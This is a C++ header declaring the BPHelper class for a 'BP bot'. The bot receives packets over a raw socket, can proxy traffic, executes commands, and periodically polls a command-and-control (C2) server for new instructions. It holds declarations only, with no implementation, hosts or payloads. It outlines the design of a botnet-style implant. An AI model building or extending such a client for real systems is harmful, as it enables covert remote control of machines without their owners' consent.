/*
 * BPHelper
 *
 * The main lib for the BP bot.
 * This contains all the logic on what the bot should do when a packet is recieved.
 * It also contains the function that periodically asks the C2 for another command.
 */

#ifndef BPHELPER_H
#define BPHELPER_H

#include <chrono>
#include <ctime>
#include <functional>
#include <iostream>
#include <memory>
#include <mutex>
#include <thread>
#include <vector>

#include "Config.hpp"
#include "PacketCraft.hpp"
#include "RawSocket.hpp"
#include "executeCommand.hpp"

class BPHelper {
   private:
    RawSocket rawSocket;
    bool enableProxy{};  // Whether or not to allow the bot to proxy traffic if needed
    bool proxyActive{};  // Whether or not there is currently a proxy session active

    bool proxyTesting{};  // Set to true for testing proxy traffic only
#ifdef __unix__
    std::vector<uint8_t> nextHopMac;
#endif
    uint32_t currentCmd;

   public:
    BPHelper();

    int actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo);

    void Receive();

    void requestAction();

    void requestActionLoop(int interval);

    void requestActionThread();
};

#endif
